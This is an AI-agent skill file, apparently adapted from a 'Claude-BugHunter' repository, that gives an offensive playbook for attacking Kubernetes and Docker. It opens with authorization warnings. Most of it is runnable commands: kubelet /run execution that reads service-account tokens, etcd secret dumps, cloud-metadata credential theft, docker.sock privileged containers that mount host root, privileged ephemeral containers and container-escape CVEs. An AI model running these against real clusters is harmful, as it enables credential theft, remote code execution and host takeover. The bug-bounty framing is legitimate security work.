---
name: hunt-k8s
description: Hunt Kubernetes & Docker
category: security
risk: offensive
source: https://github.com/elementalsouls/Claude-BugHunter
source_repo: elementalsouls/Claude-BugHunter
source_type: community
date_added: '2026-09-20'
license: MIT
license_source: https://github.com/elementalsouls/Claude-BugHunter/blob/main/LICENSE
compatibility: Requires explicit written authorization for a target scope plus the
  relevant testing tools for this technique. Docs-only; helper scripts and commands
  not bundled.
sources: hackerone_public, cve_database, kubernetes_security_research, portswigger_research
report_count: 13
---
> **⚠️ AUTHORIZED USE ONLY**
> This skill is for educational purposes or authorized security assessments only.
> You must have explicit, written permission from the system owner before using this tool.
> Misuse of this tool is illegal and strictly prohibited.

> **Mandatory confirmation gate**
> Before running any command that probes, exploits, changes, persists on, extracts data from, or attempts credential access against a target:
> 1. Ask the user to state the exact target URL, IP, account, or resource.
> 2. Ask the user to confirm written authorization and the permitted scope.
> 3. Show the exact command(s) and explain their expected effect.
> 4. Wait for explicit confirmation in the current conversation.
>
> Without that confirmation, remain read-only and provide defensive guidance only. Prefer a sandbox, disposable VM, or controlled lab.

# HUNT-K8S — Kubernetes & Docker Security

## Crown Jewel Targets

K8s API anonymous cluster-admin = full cluster control. docker.sock + RCE = host root. A single privileged-pod create or a kubelet `/run` shell pivots one finding to total compromise.

**Highest-value findings:**
- **K8s API anonymous cluster-admin** — `system:anonymous`/`system:unauthenticated` bound to a powerful role (classic misconfig: `system:anonymous` in a `ClusterRoleBinding` to `cluster-admin`) → full `kubectl`. Mere anonymous `200` is NOT this (see false-positive section).
- **Kubelet `10250` exec/run** — `/run` returns command output directly; `/exec` is a SPDY/WebSocket stream (see Phase 3). Either → RCE in any pod → steal that pod's SA token.
- **API-server-mediated kubelet RCE** — `/api/v1/nodes/<node>/proxy/run/...` reaches the kubelet *through* the API server using your (low-priv) token; if RBAC grants `nodes/proxy`, you get pod RCE without touching 10250 directly. Primary 2024-2026 vector.
- **etcd `2379` unauth** — every Secret (SA tokens, TLS keys, app creds) stored, often plaintext (unless `EncryptionConfiguration` is set) → full credential dump.
- **docker.sock exposure** — SSRF/LFI/RCE reaching `/var/run/docker.sock` → create `--privileged` container, bind-mount host `/` → host root.
- **Container escape via runc** — Leaky Vessels (CVE-2024-21626): `WORKDIR`/`process.cwd` pointing at a leaked `/proc/self/fd/<n>` host FD → break out of an attacker-controlled image/exec to host root.
- **SA token abuse** — auto-mounted token at `/var/run/secrets/kubernetes.io/serviceaccount/token`; check its real grants with SelfSubjectRulesReview before claiming impact.
- **K8s Dashboard skip-login / token-less API** — full cluster management UI reachable unauthenticated.

---

## OOB / Confirmation Gate (Read First)

K8s findings are RCE/credential-disclosure class. House rule: **prove state change or data read, never infer from a status code.**

- A `200` on `/api/v1/namespaces` does **not** mean cluster-admin. The API server returns `200` with an RBAC-filtered (often empty `items: []`) list to *any* principal that can reach `list namespaces` — anonymous read on a few resources is common and low-impact. Confirm real privilege with **SelfSubjectRulesReview / SelfSubjectAccessReview**, then by actually reading a Secret value.
- **10255 (read-only) vs 10250 (exec)** are constantly conflated. 10255 (HTTP, no auth) is info-disclosure only — it has `/pods`, `/stats`, `/metrics`, NO exec/run. 10250 (HTTPS) is where `/run` and `/exec` live. Do not report "kubelet RCE" off a 10255 hit.
- **Blind/outbound vectors need OOB.** If you exploit SSRF→IMDS→K8s, or a pod's egress, confirm the outbound hop with a Burp Collaborator / interactsh subdomain (e.g. `curl http://<token>.<collab>` from inside the pod via `/run`). A delayed response or an echoed URL is NOT proof.
- **Impact proof = the artifact.** For exec: the literal `id`/`hostname` output. For etcd/Secret: the decoded token bytes (redact in report). For docker.sock escape: the host file content (`/etc/hostname` of the node, distinct from the container's).
- Use a **dedicated test namespace / test pod** when you have create rights; never exec into production workloads to "prove" RCE — list the pod and exec a read-only `id` in a pod you spun up if policy allows, or limit to a single non-destructive `id` and stop.

---

## Phase 1 — Fingerprint & Port Discovery

```bash
# Common Kubernetes / container ports
PORTS="443,6443,8443,8080,10250,10255,10256,2379,2380,4194,9090,9100,30000-30010"
nmap -sV -p $PORTS $TARGET 2>/dev/null | grep open

# API server fingerprint — the /version endpoint is anonymous on most clusters
curl -sk "https://$TARGET:6443/version"        # {"major":"1","minor":"29","gitVersion":"v1.29.x"...}
curl -sk "https://$TARGET:6443/api"             # APIVersions list, even pre-auth
curl -sk "https://$TARGET:6443/healthz"

# Cloud metadata pivot (reach K8s SA / node creds from an SSRF foothold)
curl -s "http://169.254.169.254/latest/meta-data/iam/security-credentials/" # AWS EKS (IMDSv1)
TOK=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 60") # IMDSv2
curl -s -H "X-aws-ec2-metadata-token: $TOK" "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
curl -s "http://169.254.169.254/metadata/instance?api-version=2021-02-01" -H "Metadata: true"      # Azure AKS
curl -s "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" -H "Metadata-Flavor: Google" # GKE
```
Note the `gitVersion` — it gates every CVE below.

---

## Phase 2 — Kubernetes API Anonymous / Low-Priv Access

```bash
SRV="https://$TARGET:6443"

# 1. What am I? (anonymous → "system:anonymous")
curl -sk "$SRV/apis/authentication.k8s.io/v1/selfsubjectreviews" -X POST \
  -H 'Content-Type: application/json' \
  -d '{"apiVersion":"authentication.k8s.io/v1","kind":"SelfSubjectReview"}'

# 2. What can I actually DO? (the only honest privilege check)
curl -sk "$SRV/apis/authorization.k8s.io/v1/selfsubjectrulesreviews" -X POST \
  -H 'Content-Type: application/json' \
  -d '{"kind":"SelfSubjectRulesReview","apiVersion":"authorization.k8s.io/v1","spec":{"namespace":"default"}}'

# 3. Targeted access check for the crown-jewel verbs
for R in secrets pods nodes/proxy pods/exec; do
  curl -sk "$SRV/apis/authorization.k8s.io/v1/selfsubjectaccessreviews" -X POST \
   -H 'Content-Type: application/json' \
   -d "{\"kind\":\"SelfSubjectAccessReview\",\"apiVersion\":\"authorization.k8s.io/v1\",\"spec\":{\"resourceAttributes\":{\"verb\":\"create\",\"resource\":\"${R%%/*}\",\"subresource\":\"${R#*/}\"}}}" \
   | grep -o '"allowed":[a-z]*' | sed "s#^#$R #"
done

# 4. Only if access review says allowed — read a real Secret to prove impact
curl -sk "$SRV/api/v1/secrets" | python3 -c 'import sys,json;d=json.load(sys.stdin);print(len(d.get("items",[])),"secrets")'
# decode one value (redact before reporting):
# echo '<base64>' | base64 -d
```

**CVE-2018-1002105** (`gitVersion` < v1.10.11/1.11.5/1.12.3): API-server proxy upgrade flaw lets an unauthenticated/low-priv user escalate to backend (kubelet/aggregated-API) requests with API-server identity → cluster-admin. Fingerprint `gitVersion` in Phase 1; if vulnerable this is the single highest-impact finding.

---

## Phase 3 — Kubelet (Port 10250) — `/run` First, `/exec` Done Right

The earlier version of this skill sent `/exec` as a plain `POST` and expected `id` output back. **That is wrong.** `/exec` is a SPDY/WebSocket *streaming* endpoint: a plain POST returns a **302 redirect to a stream location** (e.g. `/cri/exec/<token>`) that you then must read with a SPDY/WebSocket client. An operator who runs the old curl sees nothing and wrongly concludes the kubelet is patched.

```bash
SRV="https://$TARGET:10250"

# Enumerate pods (auth varies; many kubelets allow anonymous read here)
curl -sk "$SRV/pods" | python3 -m json.tool 2>/dev/null \
  | grep -E '"namespace"|"name"|"containerName"' | head -40

NS=default; POD=target-pod; CTR=app

# --- PRIMITIVE A: /run — returns command output DIRECTLY (no stream handling) ---
# This is the simple correct primitive. Use this first.
curl -sk -X POST "$SRV/run/$NS/$POD/$CTR" -d "cmd=id"
curl -sk -X POST "$SRV/run/$NS/$POD/$CTR" -d "cmd=cat /var/run/secrets/kubernetes.io/serviceaccount/token"

# --- PRIMITIVE B: /exec — SPDY/WebSocket stream, NOT a plain POST ---
# Option 1: kubeletctl handles the stream transport for you (recommended)
#   kubeletctl --server $TARGET exec "id" -p $POD -c $CTR -n $NS
#   kubeletctl --server $TARGET scan rce         # finds every exec-able pod
# Option 2: raw — the POST returns a 302 to a stream path; -v to see Location, then
#   read it with a SPDY3.1/WebSocket client (wscat / websocat), e.g.:
#   curl -sk -i -X POST "$SRV/exec/$NS/$POD/$CTR?command=id&input=1&output=1&tty=0"   # shows 302 Location
#   websocat -k "wss://$TARGET:10250/cri/exec/<token-from-Location>"

# Container logs (read-only, no stream)
curl -sk "$SRV/containerLogs/$NS/$POD/$CTR"

# Read-only kubelet 10255 — INFO DISCLOSURE ONLY, no exec/run. Do not call this "RCE".
curl -s "http://$TARGET:10255/pods" | python3 -m json.tool 2>/dev/null | head
curl -s "http://$TARGET:10255/metrics" | head
```

**CVE-2020-8558** (host-network trust): on affected kube-proxy, services bound to the node's `127.0.0.1` (incl. the read-only kubelet and other localhost-only services) become reachable from other pods/adjacent hosts via the node IP, defeating the localhost trust boundary — a lateral path to kubelet/etcd that were assumed loopback-only.

---

## Phase 4 — API-Server-Mediated Kubelet RCE (`nodes/proxy`)

When 10250 is firewalled but you hold a token (even a low-priv pod SA) with `nodes/proxy`, route exec **through the API server**:

```bash
SRV="https://$TARGET:6443"; H="-H \"Authorization: Bearer $TOKEN\""
NODE=$(curl -sk -H "Authorization: Bearer $TOKEN" "$SRV/api/v1/nodes" | grep -o '"name":"[^"]*"' | head -1 | cut -d'"' -f4)

# /run via the node proxy → output comes straight back
curl -sk -X POST -H "Authorization: Bearer $TOKEN" \
  "$SRV/api/v1/nodes/$NODE/proxy/run/$NS/$POD/$CTR" -d "cmd=id"

# enumerate every pod on a node via the proxy
curl -sk -H "Authorization: Bearer $TOKEN" "$SRV/api/v1/nodes/$NODE/proxy/pods"
```
`nodes/proxy` in any bound role is effectively node-wide RCE. **CVE-2022-3294** (kube-apiserver node-address validation): an authenticated user could redirect the API server's proxy connection to an arbitrary host/IP it could reach (proxy-to-internal SSRF / node impersonation) — relevant whenever you can influence node addresses or use the proxy subresource.

---

## Phase 4b — Ingress-NGINX "IngressNightmare" (CVE-2025-1974)
An unauthenticated attacker who can reach the ingress-nginx admission controller (`:8443`, usually cluster-internal but sometimes exposed) injects arbitrary NGINX config via a crafted `AdmissionReview` for an Ingress object -> RCE in the controller pod, whose service account is powerful -> full cluster compromise. Fingerprint controller version (`/healthz`, pod image tag) and map to <1.11.5 / <1.12.1. (CVE-2025-1974 with CVE-2025-1097/1098/24513/24514.)

## Phase 5 — etcd Unauth (Port 2379)

```bash
# etcd holds ALL cluster state. Secrets are plaintext UNLESS EncryptionConfiguration is set.
ETCDCTL_API=3 etcdctl --endpoints=http://$TARGET:2379 get / --prefix --keys-only 2>/dev/null | head -50
ETCDCTL_API=3 etcdctl --endpoints=http://$TARGET:2379 \
  get /registry/secrets --prefix 2>/dev/null | strings | grep -Ei 'token|password|tls.key|dockerconfig' | head -40

# HTTP/JSON gateway (key/range are base64; "Lw==" == "/")
curl -s "http://$TARGET:2379/v3/kv/range" -H 'Content-Type: application/json' \
  -d '{"key":"L3JlZ2lzdHJ5L3NlY3JldHM=","range_end":"L3JlZ2lzdHJ5L3NlY3JldHQ=","limit":20}' | python3 -m json.tool

# v2 (older clusters)
curl -s "http://$TARGET:2379/v2/keys/?recursive=true" | python3 -m json.tool 2>/dev/null | head
```
A recovered SA token from etcd → replay against the API server (Phase 6) to confirm grants. **False positive:** a `200` from etcd peer port `2380` or a TLS-required port returning a handshake error is not unauth client access — only a successful `range`/`get` with key data is.

---

## Phase 6 — Service Account Token Abuse (Bound / Projected Tokens)

```bash
# From RCE/LFI inside a pod:
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
NS=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)
API="https://kubernetes.default.svc"

# Modern tokens are BOUND (projected): they have an audience + short expiry. DECODE before claiming reuse.
echo "$TOKEN" | cut -d. -f2 | tr '_-' '/+' | base64 -d 2>/dev/null | python3 -m json.tool <!-- security-allowlist: documented payload decoding technique reference, do not execute outside authorized scope -->
# Look at: "aud" (must match the API server audience to be accepted),
#          "exp" (projected tokens rotate ~1h — a captured token may already be dead),
#          "kubernetes.io/serviceaccount" (pod/node binding — token dies with the pod).
# If aud is e.g. ["vault"] not the api-server audience, it will NOT authenticate to the API → not cluster impact.

# Honest privilege check, then prove with a real read
curl -sk "$API/apis/authorization.k8s.io/v1/selfsubjectrulesreviews" -X POST \
  -H "Authorization: Bearer $TOKEN" -H 'Content-Type: application/json' \
  -d "{\"kind\":\"SelfSubjectRulesReview\",\"apiVersion\":\"authorization.k8s.io/v1\",\"spec\":{\"namespace\":\"$NS\"}}"
curl -sk "$API/api/v1/namespaces/$NS/secrets" -H "Authorization: Bearer $TOKEN"
```

**EphemeralContainers node-shell escalation:** with `pods/ephemeralcontainers` (or pod `create`), attach a debug container that shares the host namespaces to escape the pod:
```bash
kubectl debug node/$NODE -it --image=busybox      # mounts host root at /host → chroot /host
# or patch an ephemeral container with hostPID/privileged via the API:
curl -sk -X PATCH "$API/api/v1/namespaces/$NS/pods/$POD/ephemeralcontainers" \
  -H "Authorization: Bearer $TOKEN" -H 'Content-Type: application/strategic-merge-patch+json' \
  -d '{"spec":{"ephemeralContainers":[{"name":"x","image":"busybox","command":["sleep","1d"],"securityContext":{"privileged":true}}]}}'
```

---

## Phase 7 — Docker Socket Exposure & runc Container Escape

```bash
# docker.sock reachable (SSRF unix://, LFI of socket, or RCE on host)
curl -s --unix-socket /var/run/docker.sock http://localhost/v1.41/info
curl -s --unix-socket /var/run/docker.sock http://localhost/v1.41/containers/json

# Privileged container bind-mounting host root → read/write host fs (host escape)
curl -s --unix-socket /var/run/docker.sock -H 'Content-Type: application/json' \
  -X POST http://localhost/v1.41/containers/create?name=poc \
  -d '{"Image":"alpine","Cmd":["cat","/host/etc/hostname"],"HostConfig":{"Binds":["/:/host"],"Privileged":true}}'
curl -s --unix-socket /var/run/docker.sock -X POST http://localhost/v1.41/containers/poc/start
curl -s --unix-socket /var/run/docker.sock "http://localhost/v1.41/containers/poc/logs?stdout=1"
# Impact proof = the NODE's /etc/hostname (differs from the container's hostname).
```

**Container-escape CVEs (gate on runc/version):**
- **CVE-2024-21626 — "Leaky Vessels" (runc ≤ 1.1.11):** a leaked host file descriptor via `/proc/self/fd/<n>` lets a malicious image (`WORKDIR /proc/self/fd/N`) or `runc exec` cwd escape to the host filesystem → host RCE. Test only with an image you control on a build/registry surface where you can influence the Dockerfile.
- **CVE-2019-5736 (runc):** overwrite the host `/proc/self/exe` (the runc binary) from inside a container you can exec into → host root on next runc invocation. Applies to very old runc.
- **CVE-2022-0492 (cgroups v1 `release_agent`):** a container with `CAP_SYS_ADMIN` (or able to mount cgroupfs) writes a `release_agent` that executes on the host → escape. Check container caps first.

---

## Phase 8 — Dashboard, Admission, Helm/Tiller Remnants

```bash
# Kubernetes Dashboard — correct API base is /api/v1/... UNDER the dashboard service.
curl -sk "https://$TARGET:8443/" | grep -i "kubernetes dashboard"
# token-less probe (skip-login or anonymous-bound dashboard SA):
curl -sk "https://$TARGET:8443/api/v1/secret/default"            # secrets list view
curl -sk "https://$TARGET:8443/api/v1/pod/default"               # pods list view
curl -sk "https://$TARGET:8443/api/v1/namespace"                 # namespaces
# (paths are <resource> not <resource>/<id>; a 200 with real items = unauth dashboard data access)

# Helm 2 / Tiller remnant — gRPC on 44134, historically NO auth → full cluster as Tiller's SA
nmap -p 44134 -sV $TARGET
# helm --host $TARGET:44134 ls   # if it answers, Tiller is exposed → install/delete any release

# Validating/Mutating admission webhooks — enumerate to find bypassable policy or SSRF-able webhook URLs
curl -sk "$SRV/apis/admissionregistration.k8s.io/v1/validatingwebhookconfigurations" -H "Authorization: Bearer $TOKEN"
# A webhook clientConfig.url pointing at an external/attacker-influenced host = SSRF/bypass surface.
```

---

## Chain Table

| K8s finding | Chain to | Impact |
|-------------|----------|--------|
| API anon **with confirmed secret read** | extract SA/TLS/app creds | Full cluster compromise |
| `nodes/proxy` token | API-server-mediated `/run` → pod RCE → SA token | Node-wide RCE → escalation |
| Kubelet 10250 `/run` | exec in any pod → steal SA token → API | Cluster privilege escalation |
| etcd 2379 unauth | dump all Secrets (if unencrypted) → replay token | Full credential dump |
| docker.sock | privileged container + host bind-mount | Host root |
| CVE-2024-21626 (runc) | malicious image/exec → host FD escape | Container → host root |
| EphemeralContainers / pods create | privileged/hostPID debug container | Pod → node escape |
| Projected SA token (aud matches) | API access scoped to its real RBAC | Depends on RBAC — verify first |
| Tiller 44134 exposed | helm install as Tiller SA | Cluster-admin if Tiller is privileged |

---

## False-Positive Killers

- **Anon `200` ≠ cluster-admin.** RBAC-filtered list returns `200`/empty `items`. Require SelfSubjectRulesReview to show the verbs, then an actual Secret value read.
- **10255 ≠ 10250.** Read-only kubelet has no exec/run. "Kubelet RCE" must come from a `/run` output or a completed `/exec` stream on 10250.
- **`/exec` plain-POST returns 302, not output.** Seeing no body is NOT "patched" — follow the stream (kubeletctl/websocat) before concluding either way.
- **Projected/bound SA token may be dead or wrong-audience.** Decode `exp` and `aud`; a Vault/OIDC-audience token will not authenticate to the API server.
- **etcd plaintext assumption.** If `EncryptionConfiguration` is enabled, Secret values in etcd are ciphertext — don't claim "plaintext secrets" without showing decoded bytes.
- **Version-gated CVEs.** Confirm `gitVersion` (Phase 1) / runc version before asserting CVE-2018-1002105, -2024-21626, -2019-5736, etc. A version match is a lead; the PoC output is the proof.
- **Dashboard `200` on the HTML shell** is just the login page; only a `200` with real resource JSON under `/api/v1/<resource>/<ns>` proves token-less data access.

---

## Validation Checklist

- [ ] **API anon:** SelfSubjectRulesReview shows privileged verbs AND a real Secret value was read (redacted).
- [ ] **Kubelet:** literal `id`/`hostname` output returned from 10250 `/run`, or a completed `/exec` stream — not a bare 302.
- [ ] **nodes/proxy RCE:** command output returned through `/api/v1/nodes/<node>/proxy/run/...` with your token.
- [ ] **etcd:** decoded Secret bytes shown (proves unencrypted + readable), not just a key listing.
- [ ] **docker.sock / escape:** the NODE's host file content retrieved (distinct from container), or runc-escape PoC output.
- [ ] **SA token:** `aud`/`exp` decoded and shown valid; impact bounded to its real RBAC.
- [ ] **OOB:** any outbound/SSRF hop confirmed via Collaborator/interactsh subdomain.

**Severity:**
- API anon→secret read, kubelet/nodes-proxy RCE, etcd dump, docker.sock/runc escape, CVE-2018-1002105: **Critical**
- Dashboard token-less data access, exposed Tiller: **High**
- Read-only kubelet 10255, anon `/version`/`/pods` info disclosure: **Medium**

## When to Use

- You have explicit, written authorization to assess the target in scope, and the task matches this skill's vulnerability class or technique within a bug-bounty or penetration-test engagement.
- You need the recon, exploitation, or validation workflow described below — executed strictly inside the approved scope.

## Limitations

- Authorized scope only: the confirmation gate above is mandatory before any probing, exploitation, or credential-access command.
- Docs-only import: upstream helper scripts, commands, engine, and research assets are not bundled; reinstall tooling from the source repo when needed.
- Validate every finding (see `triage-validation`) before reporting; report via `report-writing`. Prefer a sandbox, disposable VM, or controlled lab.

### Example

```bash
# Read-only first step; confirm scope before anything active.
cat scope.txt  # target list from the authorized engagement brief
```

> Adapted from [elementalsouls/Claude-BugHunter](https://github.com/elementalsouls/Claude-BugHunter) (MIT); frontmatter, When to Use/Limitations, and safety boundaries added for upstream compliance. Docs-only import: executable helpers, commands, engine, and research assets not bundled.
